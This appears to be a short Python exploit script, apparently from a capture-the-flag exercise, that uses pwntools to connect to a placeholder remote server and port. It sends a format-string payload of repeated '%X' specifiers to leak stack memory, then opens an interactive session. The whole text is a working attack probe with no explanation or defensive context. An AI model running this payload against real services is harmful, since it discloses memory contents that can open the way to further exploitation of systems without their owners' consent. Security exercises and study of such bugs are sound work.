import pwn

r = pwn.remote('<server>',<port>);
payload = "%X " * 40

r.sendline(payload)
r.interactive()
